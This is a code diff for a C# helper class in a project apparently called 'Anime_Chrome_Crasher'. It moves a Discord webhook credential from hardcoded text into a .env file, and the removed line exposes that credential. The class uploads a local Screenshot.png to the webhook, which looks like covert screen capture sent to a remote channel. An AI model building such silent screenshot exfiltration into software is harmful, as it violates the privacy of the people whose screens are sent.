@@ -1,11 +1,30 @@
 ﻿using Discord.Webhook;
+using DotNetEnv;
+using System;
 using System.IO;
 
 namespace Anime_Chrome_Crasher
 {
     class WeebHook
     {
-        static DiscordWebhookClient discord = new DiscordWebhookClient(535418425393020939, "13xLgUxSCQa4LuNw7q40FDf21CYSVmHhwuHIhAolxHnljnWOP9Jb7emR1pcwMq55RlGl");
+        static string token = "";
+        static string webhookID;
+
+        static DiscordWebhookClient discord;
+
+        //sets the directory to where the .env file should be placed.
+        public static void ChangeDir()
+        {   
+            Environment.CurrentDirectory = Path.GetFullPath(Path.Combine(Environment.CurrentDirectory, @"..\..\..\"));
+            try { Env.Load(); }
+            catch (Exception)
+            {
+                Environment.Exit(0);
+            }
+            token = Environment.GetEnvironmentVariable("WEBHOOK_ID");
+            webhookID = Environment.GetEnvironmentVariable("WEBHOOK_TOKEN");
+            discord = new DiscordWebhookClient(Convert.ToUInt64(token), webhookID);
+        }
 
         public static void SendMessage(string message)
         {
@@ -14,8 +33,16 @@ namespace Anime_Chrome_Crasher
 
         public static void SendImage()
         {
-            if (File.Exists("Screenshot.png")) {
-                discord.SendFileAsync("Screenshot.png", "");
+            string fileLocation = Environment.CurrentDirectory + @"\Screenshot.png";
+            if (File.Exists(fileLocation)) {
+                try
+                {
+                    discord.SendFileAsync(fileLocation, " ");
+                }
+                catch (Exception)
+                {
+                    SendMessage("Failed to send Screenshot :(!");
+                }
             }
         }
     }   
